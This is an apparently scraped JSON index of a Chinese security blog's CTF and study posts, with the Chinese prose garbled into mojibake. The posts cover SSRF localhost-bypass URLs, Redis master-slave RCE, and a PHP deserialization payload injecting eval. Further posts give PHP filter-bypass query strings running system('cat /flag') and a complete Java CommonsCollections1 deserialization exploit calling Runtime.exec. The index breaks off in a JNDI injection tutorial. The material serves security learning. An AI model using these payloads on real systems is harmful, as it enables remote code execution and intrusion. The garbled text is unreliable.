=&gt; anchor)#æ³¨æ„:parse_url() æ˜¯ä¸“é—¨ç”¨æ¥è§£æ URL è€Œä¸æ˜¯ URI çš„ã€‚ä¸è¿‡ä¸ºéµä» PHP å‘åå…¼å®¹çš„éœ€è¦æœ‰ä¸ªä¾‹å¤–ï¼Œå¯¹ file:// åè®®å…è®¸ä¸‰ä¸ªæ–œçº¿ï¼ˆfile:///...ï¼‰ã€‚ gethostbyname â€” è¿”å›ä¸»æœºåå¯¹åº”çš„ IPv4åœ°å€ã€‚ip2long() â€” è¿”å›å…¶é•¿æ•´æ•°å‹çš„ip 2020ç½‘é¼æ¯SSRFæ‰“rediså†æœ¬é¢˜ä¸­ï¼Œä»–ç»™äº†ä¸€ä¸ªæç¤ºï¼š/Please visit hint.php locally.ä½†æ˜¯ä»–å¯¹æˆ‘ä»¬è®¿é—®æœ¬åœ°åšäº†ä¸€ä¸ªwafï¼Œé˜²æ­¢æˆ‘ä»¬è®¿é—®åˆ°ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ˜¯éœ€è¦è¿›è¡Œç»•è¿‡çš„ï¼Œç»•è¿‡æœ¬åœ°çš„å§¿åŠ¿æœ‰å¾ˆå¤š è·³è½¬/è§£æåˆ°127.0.0.1ï¼šhttp://127.0.0.1.nip.io/hint.phpç¼–ç ç»•è¿‡ï¼šhttp://0x7f.0.0.1/hint.phpç‰¹æ®Šå­—ç¬¦ç»•è¿‡http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ /hint.phphttp://[0:0:0:0:0:ffff:127.0.0.1]/hint.php#è¿™ä¸ªåœ¨è¿™é‡Œå¯ä»¥ç»•è¿‡http://127ã€‚0ã€‚0ã€‚1/flag.phphttp://127.1/flag.phphttp://[::]:80/flag.phphttp://127.0.0.1./flag.php æ¥ä¸‹æ¥ä»–ç»™äº†æˆ‘ä»¬å…³é”®çš„æºç ï¼Œè§£æä¸€ä¸‹æœ¨ä¹åæˆ‘ä»¬éœ€è¦postä¸€ä¸ªæ–‡ä»¶å»æ€§è¿›è¡Œæ‰§è¡Œï¼Œä½†æ˜¯å‰é¢æœ‰ä¸€ä¸ªexit()éœ€è¦æˆ‘ä»¬å»ç»•è¿‡ï¼Œè¿™ä¸ªç»•è¿‡çš„æ–¹å¼æˆ‘è®°å¾—æ˜¯ç”¨ä¼ªåè®®è¿›è¡Œç»•è¿‡å³å¯ string(1342) &quot; &lt;?phpif($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){ highlight_file(__FILE__);}if(isset($_POST['file'])){ file_put_contents($_POST['file'],&quot;&lt;?php echo 'redispass is root';exit();&quot;.$_POST['file']);} è¿™é‡Œæä¾›äº†redisçš„å¯†ç ï¼Œåˆæ˜¯ä¸€ä¸ªfile_put_contentsçš„å‡½æ•°ï¼Œé‚£å°±æ˜¯ssrfæ‰“redisäº†ï¼Œè¯•äº†ä¸€ä¸‹ç”¨gopherå‘é€è¯·æ±‚å´æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯è€ƒè™‘ä¸€ä¸‹ä½¿ç”¨ä¸»ä»å¤åˆ¶RCEä»Šå¤©é…ç½®äº†å¾ˆä¹…ï¼Œå†³å¿ƒä¸€å®šè¦å¥½å¥½è®°å½•ä¸€ä¸‹é¦–å…ˆç†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ä¸»ä»å¤åˆ¶rce 1.åˆ†æ¸…è°æ˜¯ä¸»è°æ˜¯ä»æˆ‘ä»¬è¦è®©å¯¹é¢çš„æœåŠ¡å™¨åŠ è½½æˆ‘ä»¬æœåŠ¡å™¨ä¸Šçš„æ¶æ„æ–‡ä»¶.soï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸»ï¼Œå¯¹é¢æ˜¯ä»2.å¦‚ä½•è®©å¯¹é¢çš„æœåŠ¡å™¨åŠ è½½é¦–å…ˆéœ€è¦åœ¨æœåŠ¡å™¨æ”¾ä¸Šè¿™ä¸¤ä¸ªå·¥å…·ï¼Œä¸€ä¸ªæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤è¾“å‡ºpayloadçš„å·¥å…·ï¼Œä¸€ä¸ªæ˜¯å¼€å¯æœåŠ¡å™¨çš„å·¥å…·3.lhostå’Œrhostrhostå³ä¸ºä»ï¼Œlhostä¸ºä¸»ï¼Œå¹¶ä¸”è¿™é‡Œçš„lhostä¸ºäº†èƒ½è®©å¯¹é¢çš„æœåŠ¡å™¨åŠ è½½ï¼Œå¿…é¡»è¦æ˜¯vps æ¥ä¸‹æ¥å°±æ¢³ç†ä¸€ä¸‹æ•´ä½“æµç¨‹:å°†exp.soç§»åŠ¨åˆ°è¿™ä¸ªç›®å½•ç„¶åå…ˆåœ¨æœ¬åœ°çš„ssef-redisè„šæœ¬æ–‡ä»¶è¿›è¡Œä¿®æ”¹ä¸€ä¸‹ï¼š å¯¹ä»¥ä¸Šä¸‰ä¸ªåœ°æ–¹è¿›è¡Œä¿®æ”¹ï¼Œä¿®æ”¹å®Œä»¥åï¼Œå³å¯è¾“å‡ºpayloadï¼Œæ¥ä¸‹æ¥å¯åŠ¨redisæœåŠ¡ï¼Œç„¶åæŠŠpayloadå†è¿›è¡Œä¸€æ¬¡urlencodeå³å¯å¼€æ‰“ å¦‚æœè¦åå¼¹shellï¼Œå°±æŠŠé‚£ä¸ªå‘½ä»¤æ”¹æˆåå¼¹shellçš„æŒ‡ä»¤ï¼Œåœ¨æœåŠ¡å™¨ä¸Šå¼€å¯ç›‘å¬å³å¯ 2021å¤©ç¿¼æ¯â€”â€”easyevalä¸€å¼€å§‹æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ç»•è¿‡wakeupå‡½æ•°çš„,ä½†æ˜¯ä»–æœ‰è¿‡æ»¤ï¼Œåªè¯†åˆ«Aå’ŒBä¸¤ä¸ªç±»ï¼Œæ‰€ä»¥å¯ä»¥åœ¨å¤–é¢å†åµŒå¥—ä¸€å±‚Cï¼Œæ”¹å˜å¯¹è±¡æ•°ç›®ï¼Œå³å¯ç»•è¿‡ &lt;?phperror_reporting(0);class A{ public $code = &quot;eval(\\$_POST['a']);&quot;; #public $code = 'phpinfo();'; function __call($method,$args){ print(&quot;yes&quot;); echo $this-&gt;code; eval($this-&gt;code); } function __wakeup(){ $this-&gt;code = &quot;&quot;; }}class B{ public $a; function __destruct(){ echo $this-&gt;a-&gt;a(); }}class C{ public $c;}$a=new A();$b=new B();$c=new C();$b-&gt;a=$a;$c-&gt;c=$b;$d=serialize($c);echo $d;echo &quot;\\n&quot;; ç„¶åå°±å»å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å‘ç°ä»–phpinfo()ä¸­disable_functionè¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°=-=å®Œå…¨æ‰§è¡Œä¸äº†ï¼Œä½†æ˜¯çœ‹åˆ°æœ‰ä¸ªé…ç½®æ–‡ä»¶ï¼Œredisçš„é…ç½®æ–‡ä»¶ï¼Œåˆå‘ç°file_get_contentså‡½æ•°æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œäºæ˜¯å»æ‰“äº†ä¸€ä¸‹6379ç«¯å£ï¼Œå‘ç°å¯ä»¥æ‰“é€šï¼Œæ‰€ä»¥æ„Ÿè§‰å¤§æ¦‚ç‡æ˜¯ssrfæ‰“redisæ€è·¯å¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§: 1.å¤‡ä»½crontabåå¼¹shell2.å¤‡ä»½æ–‡ä»¶å†™é©¬3.ä¸»ä»å¤åˆ¶rce4.å†™æ— æŸæ–‡ä»¶ç”¨èšå‰‘è¿æ¥ï¼Œå‘ç°tmpç›®å½•ä¸‹å¯å†™æ–‡ä»¶ï¼Œäºæ˜¯ç›´æ¥æŠŠredisçš„æ¶æ„æ¨¡å—exp.soæ”¾è¿›å»ç„¶ååˆ©ç”¨èšå‰‘çš„redisæ’ä»¶ç›´æ¥è¿›è¡Œè¿æ¥æ•°æ®åº“ï¼Œå¯†ç åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰å†™ ç„¶åå°±ç™»å½• å°ç»“ä»Šå¤©å­¦ä¹ çš„éƒ½æ˜¯SSRFé€šè¿‡ä¸»ä»å¤åˆ¶æ‰“redisè¿›è¡Œrceçš„ï¼Œç†è§£å®Œä»¥åå‘ç°ä¹Ÿæ²¡å•¥éš¾ç‚¹â€“ï¼Œä¸»è¦æ˜¯æ‰¾åˆ°ä¸€ç¯‡çœ‹å¾—æ‡‚çš„æ•™ç¨‹https://blog.csdn.net/rfrder/article/details/113651337","link":"/2021/09/23/SSRF%E6%89%93redis/"},{"title":"","text":"","link":"/2023/02/14/access%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/"},{"title":"EDIå†…éƒ¨ctf","text":"##web2å¸¸è§çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°å·²ç»è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œä¸»è¦å¯»æ‰¾å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•° preg_match('/call|system|exec|popen|file|passthru|open|eval|map|include|require|filter|assert|env|preg|ini|read|write|rename|show|sort|func|curl|copy|dir|get|proc|ld/i',$str) ä¸‹é¢ä½¿ç”¨çš„æ˜¯call_user_func_arrayæ¥æ‰§è¡Œå‘½ä»¤ä¼ å…¥çš„å‚æ•°ä¸ºï¼Œç¬¬ä¸€ä¸ªä¸ºæ‰€è¦è°ƒç”¨çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªä¸ºæ‰§è¡Œå‡½æ•°çš„å‚æ•°ï¼Œä¸”å¿…é¡»ä¸ºæ•°ç»„ï¼Œè¿™ä¸ªæ—¶å€™å°±å»ç¿»phpæ–‡æ¡£å¯»æ‰¾å¯ä»¥è°ƒç”¨çš„å‡½æ•°å³å¯ï¼šå‘ç°å¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ï¼šä½†æ˜¯ç¬¬ä¸€ä¸ªç”±äºç‰ˆæœ¬çš„åŸå› ï¼Œç”¨ä¸äº†ï¼ˆæœ¬åœ°æµ‹è¯•7.4.3ï¼‰å¯ä»¥ä½¿ç”¨ ?func=array_reduce&amp;args[0][0]=&amp;args[0][1]=;}system('ls');/*&amp;args[1]=create_function&amp;args[2]=No data to reduce?func=array_intersect_uassoc&amp;args[0][system('cat /flag')]=&amp;args[1][0]=&amp;args[3]=assert","link":"/2023/01/08/edictf/"},{"title":"gitå¯è§†åŒ–æ•™ç¨‹","text":"","link":"/2022/03/17/git%E5%8F%AF%E8%A7%86%E5%8C%96%E6%95%99%E7%A8%8B/"},{"title":"java_CommonCollections1åˆ©ç”¨","text":"CommonCollections1åˆ©ç”¨é“¾demoä»Pç¥çš„demoæ¥ç†è§£ import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class CommonCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class}, new Object[]{&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;}) }; Transformer transformerChain= new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap=TransformedMap.decorate(innerMap,null,transformerChain); outerMap.put(&quot;test&quot;,&quot;x&quot;); }} æ¥ä¸‹æ¥å­¦ä¹ ä¸€ä¸‹é‡Œé¢çš„æ¥å£å’Œç±» TransformedMapTransformedMapç”¨äºå¯¹javaæ ‡å‡†æ•°æ®ç»“æ„Mapåšä¸€ä¸ªä¿®é¥°ï¼Œè¢«ä¿®é¥°è¿‡çš„Mapåœ¨æ·»åŠ æ–°çš„å…ƒç´ æ—¶ï¼Œå°†å¯ä»¥æ‰§è¡Œä¸€ä¸ªå›è°ƒã€‚æˆ‘ä»¬é€šè¿‡ä¸‹é¢è¿™è¡Œä»£ç å¯¹innerMapè¿›è¡Œä¿®é¥°ï¼Œä¼ å‡ºçš„outerMapå³æ˜¯ä¿®é¥°åçš„Map: Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,valueTransformer); å…¶ä¸­ï¼ŒkeyTransformeræ˜¯å¤„ç†æ–°å…ƒç´ çš„keyçš„å›è°ƒï¼ŒvalueTransormeræ˜¯å¤„ç†æ–°å…ƒç´ çš„valueçš„å›è°ƒã€‚æˆ‘ä»¬æ‰€è¯´çš„å›è°ƒï¼Œå¹¶ä¸æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„å›è°ƒå‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªå®ç°äº†Transformeræ¥å£çš„ç±»ã€‚ Transformerçš„ä½œç”¨æ˜¯ï¼šå¯¹å…¶é›†åˆçš„å…ƒç´ è¿›è¡Œå¢åŠ ï¼Œåˆ é™¤æˆ–ä¿®æ”¹æ—¶è°ƒç”¨transformæ–¹æ³•è¿›è¡Œç‰¹å®šçš„ä¿®é¥°å˜æ¢ï¼Œè€Œè¿™ä¸ªtransformæ˜¯æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ TransformerTransformeræ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ƒåªæœ‰ä¸€ä¸ªå¾…å®ç°çš„æ–¹æ³•ï¼š public interface Transformer{ public object transform(object input);} TransformedMapåœ¨è½¬æ¢Mapçš„æ–°å…ƒç´ æ—¶ï¼Œå°±ä¼šè°ƒç”¨transformæ–¹æ³•ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±ç±»ä¼¼åœ¨è°ƒç”¨ä¸€ä¸ªâ€œå›è°ƒå‡½æ•°â€ï¼Œè¿™ä¸ªå›è°ƒçš„å‚æ•°æ˜¯åŸå§‹å¯¹è±¡ã€‚ ConstantTransformerConstantTransformeræ˜¯å®ç°äº†Transformeræ¥å£çš„ä¸€ä¸ªç±»ï¼Œå®ƒçš„è¿‡ç¨‹å°±æ˜¯åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶åœ¨transformæ–¹æ³•å°†è¿™ä¸ªå¯¹è±¡å†è¿”å›ã€‚ public ConstantTransformer(Object constantToReturn){ super(); iConstant=constantToReturn;}public Object transform(Object input){ return iConstant;} ä½œç”¨æ˜¯ åŒ…è£…ä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”åœ¨æ‰§è¡Œå›è°ƒæ—¶ï¼Œè¿”å›è¿™ä¸ªå¯¹è±¡ï¼Œæ–¹ä¾¿åç»­æ“ä½œã€‚ InvokerTransformerInvokerTransformeræ˜¯å®ç°äº†Transformeræ¥å£çš„ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»å¯ä»¥ç”¨æ¥æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œä¹Ÿæ˜¯ååºåˆ—åŒ–èƒ½æ‰§è¡Œä»»æ„ä»£ç çš„å…³é”®ã€‚ åœ¨å®ä¾‹åŒ–è¿™ä¸ªInvokerTransformeræ—¶ï¼Œéœ€è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¾…æ‰§è¡Œçš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨ã€‚ public InvokerTransformer(String methodName, Class paramTypes, Object[] args){ super(); iMethodName=methodName; iParamTypes=paramTypes; iArgs=args;} åé¢çš„å›è°ƒtransformæ–¹æ³•ï¼Œå°±æ˜¯æ‰§è¡Œäº†inputå¯¹è±¡çš„iMethodNameæ–¹æ³•ã€‚ public Object transform(object input){ if(input == null){ return null; } try{ Class cls=input.getClass(); Method method = cls.getMethod(iMethodName,iParamTypes); return method.invoke(input,iArgs); }catch(NoSuchMethodException ex){ throw new FunctorException(&quot;InvokerTransformer: The method '&quot;+iMethodName+&quot;'on'&quot;+input.getClass() + &quot;'does not exist&quot;); }catch (IllegalAccessException ex){ throw new FunctorException(&quot;InvokerTransformer: The method '&quot; +iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;); } catch (InvocationTargetException ex) { throw new FunctorException(&quot;InvokerTransformer: The method '&quot; +iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, ex); }} ChainedTransformerChainedTransformerçš„ä½œç”¨æ˜¯å°†å†…éƒ¨çš„å¤šä¸ªTransformerä¸²åœ¨ä¸€èµ·ï¼Œå°†å‰ä¸€ä¸ªå›è°ƒè¿”å›çš„ç»“æœï¼Œä½œä¸ºåä¸€ä¸ªå›è°ƒçš„å‚æ•°ä¼ å…¥ public ChainedTransformer(Transformer[] transformers){ super(); iTransformers = transformers;}public Object transform(Object object){ for(int i=0; i&lt; iTransformers.length; i ++){ object = iTransformers[i].transform(object); } return object;} ç†è§£demoTransformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class}, new Object[]{&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;}) }; Transformer transformerChain= new ChainedTransformer(transformers); é€šè¿‡æ–°å»ºä¸€ä¸ªChainedTransformerï¼Œä¸€å¼€å§‹åŒ…å«äº†ä¸¤ä¸ªTransformerï¼›ç¬¬ä¸€ä¸ªæ˜¯ConstantTransformerï¼Œæ ¹æ®å‰é¢çš„å­¦ä¹ ï¼Œä»–çš„ä½œç”¨æ˜¯æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶åœ¨transformæ–¹æ³•çš„æ—¶å€™å°†è¿™ä¸ªå¯¹è±¡è¿”å›ï¼Œè€ŒinvokerTransformerï¼Œåˆ™æ˜¯æ‰§è¡ŒRuntimeå¯¹è±¡çš„execï¼Œå‚æ•°æ˜¯åé¢çš„åœ°å€ã€‚ æ­¤æ—¶çš„ransformerChainå°†å†…éƒ¨çš„å¤šä¸ªTransformedMapä¸²æ¥åœ¨ä¸€èµ·ï¼Œå°†å…¶å’Œå°è£…å…¥innerMapï¼Œé€šè¿‡åœ¨Mapä¸­æ”¾å…¥ä¸€ä¸ªæ–°å…ƒç´ è§¦å‘å›è°ƒ Map innerMap=new HashMap(); Map outerMap=TransformedMap.decorate(innerMap,null,transformerChain); outerMap.put(&quot;test&quot;,&quot;x&quot;); ç”¨TransformedMapç¼–å†™POCè¦è§¦å‘ä¸Šé¢CCé“¾ï¼Œéœ€è¦åœ¨Mapä¸­æ”¾å…¥ä¸€ä¸ªæ–°å…ƒç´ æ¥å®ç°è§¦å‘ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªé“¾ï¼Œåœ¨ååºåˆ—åŒ–çš„èµ·ç‚¹readObjecté€»è¾‘é‡Œæœ‰å†™å…¥æ“ä½œã€‚ è¿™ä¸ªç±»å°±æ˜¯sun.reflect.annotation.AnnotationInvocationHandlerï¼Œå…¶readObjectæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¸€ä¸‹å†™å…¥éƒ¨åˆ†çš„ä»£ç  Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); å…¶ä¸­memberValueså°±æ˜¯ååºåˆ—åŒ–åå¾—åˆ°çš„Mapï¼Œä¹Ÿæ˜¯ç»è¿‡äº†TransormedMapä¿®é¥°çš„å¯¹è±¡ï¼Œè¿™é‡Œéå†äº†å®ƒçš„æ‰€æœ‰å…ƒç´ ï¼Œå¹¶ä¾æ¬¡è®¾ç½®å€¼ï¼Œåœ¨è°ƒç”¨setValueè®¾ç½®å€¼çš„æ—¶å€™å°±ä¼šè§¦å‘TransformedMapé‡Œæ³¨å†Œçš„Transformï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œæˆ‘ä»¬ä¸Šé¢æ„é€ çš„ä»£ç ã€‚ ç”±äºsun.reflect.annotation.AnnotationInvocationHandleræ˜¯jdkå†…éƒ¨çš„ç±»ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨newæ¥å®ä¾‹åŒ–ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨åå°„æ¥è·å–åˆ°å…¶æ„é€ æ–¹æ³•ï¼Œï¼Œè€Œè¿™ä¸ªç±»çš„æ„é€ å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Annotationç±»ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‰é¢æ„é€ çš„Mapã€‚ Class clazz= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor construct= clazz.getDeclaredConstructor(Class.class,Map.class);construc.setAccessible(true);Object obj=construc.newInstance(Retention.class,outerMap); ä¸ºä»€ä¹ˆè¦ä½¿ç”¨åå°„é€šè¿‡ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—åºåˆ—åŒ–æµï¼Œ ByteArrayOutputStream barr= new ByteArrayOutputStream(); ObjectOutputStream oos= new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); å€¼å¾—æ³¨æ„çš„æ˜¯:å¾…åºåˆ—åŒ–çš„å¯¹è±¡å’Œæ‰€æœ‰å®ƒä½¿ç”¨çš„å†…éƒ¨å±æ€§å¯¹è±¡ï¼Œå¿…é¡»éƒ½å®ç°java.io.Serializableæ¥å£ï¼Œä½†æ˜¯æœ€æ—©ä¼ ç»™ConstantTransformaerçš„æ˜¯Runtime.getRuntime(),Runtimeç±»æ˜¯æ²¡æœ‰å®ç°java.io.Serializableæ¥å£ï¼Œæ‰€ä»¥ä¸å…è®¸è¢«åºåˆ—åŒ–ã€‚ â€‹ å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„æ¥è·å–åˆ°ä¸Šä¸‹æ–‡ä¸­çš„Runtimeå¯¹è±¡ï¼Œ Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);Runtime r=(Runtime) f.invoke(null);r.exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;); è½¬åŒ–ä¸ºTransformerçš„å†™æ³•å¦‚ä¸‹ï¼š Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{ String.class, Class.class },new Object[]{&quot;getRuntime&quot;,new Class[0]}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{ Object.class, Object[].class }, new Object[]{null,new Object[0]}), new InvokerTransformer(&quot;exec&quot;,new Class[]{ String.class }, new String[]{ &quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot; }),}; è¿™ä¸ªå’Œå‰é¢çš„åŒºåˆ«åœ¨äºï¼ŒRuntime.getRuntime()æ¢æˆäº†Runtime.classï¼Œå‰è€…ä¸ºjava.lang.Runtimeå¯¹è±¡ï¼Œåè€…ä¸ºjava.lang.Classå¯¹è±¡ exppackage test;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.util.HashMap;import java.util.Map;public class CommonCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{ String.class, Class[].class },new Object[]{&quot;getRuntime&quot;,new Class[0]}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{ Object.class, Object[].class }, new Object[]{null,new Object[0]}), new InvokerTransformer(&quot;exec&quot;,new Class[]{ String.class }, new String[]{ &quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot; }), }; Transformer transformerChain= new ChainedTransformer(transformers); Map innerMap=new HashMap(); innerMap.put(&quot;value&quot;,&quot;x&quot;); Map outerMap=TransformedMap.decorate(innerMap,null,transformerChain); Class clazz=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class); construct.setAccessible(true); InvocationHandler handler=(InvocationHandler) construct.newInstance(Retention.class,outerMap); ByteArrayOutputStream barr= new ByteArrayOutputStream(); ObjectOutputStream oos= new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o=(Object) ois.readObject(); }} å°ç»“ï¼šæ€»ç»“ä¸€ä¸‹è¿™éƒ¨åˆ†çš„å†…å®¹ï¼šé¦–å…ˆåˆ©ç”¨çš„æ˜¯Ysoserialçš„hashmapå‡½æ•°ï¼Œå®ç°ååºåˆ—åŒ–ï¼Œé“¾æ¡ä½¿ç”¨çš„ç±»æ˜¯commoncollections1ä¸­çš„ï¼Œå…¶ä¸­æœ€é‡è¦çš„å°±æ˜¯Transformedï¼Œå¯ä»¥è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œé€šè¿‡ä¸€ç³»åˆ—æ“ä½œï¼Œå³å¯ä»»æ„ä»£ç æ‰§è¡Œï¼Œä½†æ˜¯å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè°ƒç”¨çš„ç±»éœ€è¦å…·æœ‰serializeæ¥å£ï¼Œæ‰èƒ½å®ç°åºåˆ—åŒ–ã€‚","link":"/2022/04/06/java-CommonCollections1%E5%88%A9%E7%94%A8/"},{"title":"jav-jdbc+äºŒæ¬¡åºåˆ—åŒ–","text":"##jdbcååºåˆ—åŒ–","link":"/2023/01/07/java-jdbc+%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"java-jndiæ³¨å…¥","text":"#JNDIæ³¨å…¥é¦–å…ˆåœ¨å‰é¢å¤§è‡´æ‹ä¸€ä¸‹åŸºç¡€çŸ¥è¯†ï¼Œäº†è§£ä»€ä¹ˆæ˜¯JNDIä»€ä¹ˆæ˜¯RMIï¼Œç„¶åå†è®²è§£åˆ©ç”¨æ‰‹æ³•##JNDIJNDIå…¨ç§°ä¸º Java Naming and DirectoryInterfaceï¼ˆJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰ï¼Œæ˜¯ä¸€ç»„åº”ç”¨ç¨‹åºæ¥å£ï¼Œä¸ºå¼€å‘äººå‘˜æŸ¥æ‰¾å’Œè®¿é—®å„ç§èµ„æºæä¾›äº†ç»Ÿä¸€çš„é€šç”¨æ¥å£ï¼Œå¯ä»¥ç”¨æ¥å®šä¹‰ç”¨æˆ·ã€ç½‘ç»œã€æœºå™¨ã€å¯¹è±¡å’ŒæœåŠ¡ç­‰å„ç§èµ„æºã€‚ JNDIæ”¯æŒçš„æœåŠ¡ä¸»è¦æœ‰ï¼šDNSã€LDAPã€CORBAã€RMIç­‰ã€‚ ç®€å•ç‚¹è¯´ï¼ŒJNDIå°±æ˜¯ä¸€ç»„APIæ¥å£ã€‚æ¯ä¸€ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ç»„å”¯ä¸€çš„é”®å€¼ç»‘å®šï¼Œå°†åå­—å’Œå¯¹è±¡ç»‘å®šï¼Œå¯ä»¥é€šè¿‡åå­—æ£€ç´¢æŒ‡å®šçš„å¯¹è±¡ï¼Œè€Œè¯¥å¯¹è±¡å¯èƒ½å­˜å‚¨åœ¨RMIã€LDAPã€CORBAç­‰ç­‰ã€‚ æŒ‰ç…§æˆ‘çš„ç†è§£ï¼ŒJNDIå°±æ˜¯æä¾›ç”¨äºé’ˆå¯¹ä¸åŒçš„åè®®æä¾›ä¸åŒçš„æŸ¥è¯¢æ–¹å¼çš„æœåŠ¡ã€‚##JNDI+RMI###RMIRMIæ˜¯javaä¸­çš„ä¸€ç§åè®®ï¼Œç±»ä¼¼äºhttpï¼ŒåŠ äº†ä¸€ä¸ªrmiå¤´ï¼Œjavaå°±ä¼šä½¿ç”¨rmiçš„åè®®è¯·æ±‚æ–¹æ³•å»è¯·æ±‚###JNDI+RMIæœåŠ¡ç¼–å†™å®ç°å¯¹è±¡åˆ›å»ºæ¥å£ï¼š package org.example;import java.rmi.Remote;import java.rmi.RemoteException;public interface IHello extends Remote { public String sayHello(String name) throws RemoteException;} å®ç°æ¥å£åŠŸèƒ½ï¼š package org.example;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class IHelloImpl extends UnicastRemoteObject implements IHello { protected IHelloImpl() throws RemoteException { super(); } @Override public String sayHello(String name) throws RemoteException { return &quot;Hello &quot; + name; }} å®¢æˆ·ç«¯ï¼š package org.example;import javax.naming.InitialContext;public class JNDIRMIClient { public static void main(String[] args) throws Exception { 